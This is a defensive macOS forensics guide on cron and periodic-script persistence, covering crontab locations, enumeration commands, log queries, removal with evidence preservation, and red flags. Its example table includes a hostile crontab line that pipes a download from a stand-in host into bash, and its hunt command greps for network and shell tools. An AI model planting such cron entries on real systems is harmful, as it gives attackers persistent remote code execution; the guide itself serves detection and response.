# Cron Jobs

Despite Apple steering everything toward `launchd`, **cron still works on modern macOS** (the `com.vix.cron` LaunchDaemon runs `/usr/sbin/cron`). It's a classic, portable UNIX persistence mechanism attackers reach for because it's simple and often overlooked. Both **per-user** and **system-wide** crontabs exist, plus the `periodic` system.

> 🔴 Cron is easy to miss in macOS triage because everyone looks at LaunchAgents/Daemons. Check `crontab -l` for every user and `/usr/lib/cron/tabs/`. On modern macOS, **`cron` needs Full Disk Access (TCC)** to actually run user crontabs — but the entries persist on disk regardless and run once granted/where applicable.

## Contents
- [Quick Triage](#quick-triage)
- [Where Cron Lives](#where-cron-lives)
- [Reading a Crontab Entry](#reading-a-crontab-entry)
- [Enumerating Cron](#enumerating-cron)
- [The periodic System](#the-periodic-system)
- [Removing Malicious Jobs](#removing-malicious-jobs)
- [Logs](#logs)
- [Red Flags](#red-flags)
- [Resources](#resources)

---

## Quick Triage

```bash
# Current user's crontab
crontab -l

# Every user's crontab on disk (need root)
sudo ls -la /usr/lib/cron/tabs/

sudo sh -c 'for f in /usr/lib/cron/tabs/*; do echo "== $f =="; cat "$f"; done'

# System crontab + periodic config
cat /etc/crontab 2>/dev/null

ls -la /etc/periodic/daily /etc/periodic/weekly /etc/periodic/monthly
```

---

## Where Cron Lives

| Path | Holds |
|---|---|
| 🔴 `/usr/lib/cron/tabs/<user>` | **Per-user** crontabs (one file per user; managed by `crontab`) |
| `/etc/crontab` | System-wide crontab (usually empty on macOS) |
| `/usr/lib/cron/allow` / `deny` | Who may use cron |
| `/etc/periodic/{daily,weekly,monthly}/` | 🔴 **periodic** scripts (run via launchd) |
| `/etc/periodic.conf`, `/etc/defaults/periodic.conf` | periodic configuration |
| `/var/at/...` | `at` one-shot jobs (related scheduler) |

> The cron daemon itself is launched by **`/System/Library/LaunchDaemons/com.vix.cron.plist`** — disabling that is how Apple "removed" cron, but it still ships and runs.

---

## Reading a Crontab Entry

```
┌ minute (0–59)
│ ┌ hour (0–23)
│ │ ┌ day-of-month (1–31)
│ │ │ ┌ month (1–12)
│ │ │ │ ┌ day-of-week (0–7, 0/7=Sun)
│ │ │ │ │
* * * * *  /path/to/command args
```

Examples:

| Entry | Runs |
|---|---|
| `*/5 * * * * /tmp/.x` | 🔴 Every 5 minutes (beaconing) |
| `0 * * * * curl -s http://evil/c | bash` | 🔴 Hourly stager |
| `@reboot /Users/Shared/.persist` | 🔴 At every boot |
| `30 9 * * 1-5 /usr/local/bin/job` | Weekdays 09:30 (looks legit) |

Special strings: `@reboot`, `@daily`, `@hourly`, `@weekly`, `@monthly`.

---

## Enumerating Cron

```bash
# Current user
crontab -l

# A specific user
sudo crontab -l -u username

# All user crontab files (raw, incl. users you might miss)
sudo ls -la /usr/lib/cron/tabs/

sudo grep -rEv '^\s*#' /usr/lib/cron/tabs/ 2>/dev/null

# System + allow/deny
cat /etc/crontab 2>/dev/null

cat /usr/lib/cron/allow /usr/lib/cron/deny 2>/dev/null

# Hunt for suspicious payloads in any crontab
sudo grep -riE 'curl|wget|base64|/tmp/|/Users/Shared/|python|osascript|bash -i' /usr/lib/cron/tabs/ /etc/crontab 2>/dev/null
```

---

## The periodic System

macOS runs maintenance scripts via **periodic** (daily/weekly/monthly), triggered by `com.apple.periodic-*` LaunchDaemons.

```bash
ls -la /etc/periodic/daily/ /etc/periodic/weekly/ /etc/periodic/monthly/

cat /etc/periodic.conf 2>/dev/null

# Local additions live here and are a stealth spot
ls -la /usr/local/etc/periodic/ 2>/dev/null
```

🔴 An attacker can drop an executable script into `/etc/periodic/daily/` (or the `local` dirs) for scheduled root execution that hides among Apple's maintenance scripts.

---

## Removing Malicious Jobs

```bash
# Edit the user's crontab (remove the malicious line)
crontab -e

# Remove the user's ENTIRE crontab (careful)
crontab -r

# For another user
sudo crontab -r -u username

# Preserve evidence FIRST
sudo cp /usr/lib/cron/tabs/username /evidence/crontab_username
```

> 🔴 **Image/copy the crontab before removing it** — it's evidence (and note its mtime/ctime for the timeline).

---

## Logs

```bash
# cron execution in the Unified Log
log show --predicate 'process == "cron"' --info --last 7d

# Each run also shows the command + user
log show --predicate 'process == "cron" AND eventMessage CONTAINS[c] "CMD"' --info --last 7d
```

> Historically cron logged to `/var/cron/log` and syslog; modern macOS surfaces it in the Unified Log. Cross-ref the Unified Logs notes.

---

## Red Flags

| 🔴 Finding | Likely meaning |
|---|---|
| A crontab for a user who shouldn't have one | Planted persistence |
| Entry running `curl|bash`, `wget`, base64, `/tmp/` script | Stager / downloader |
| `@reboot` or `*/N` interval to an odd binary | Boot persistence / beaconing |
| Hidden script names (leading `.`) | Stealth |
| Script dropped in `/etc/periodic/*` | Root persistence hiding in maintenance |
| Crontab mtime recent vs account/system age | Recently added (cross-ref FSEvents) |
| cron granted **Full Disk Access** unexpectedly (TCC) | Enabling cron to run protected jobs |

---

## Resources

- `man 5 crontab` · `man cron` · `man periodic`
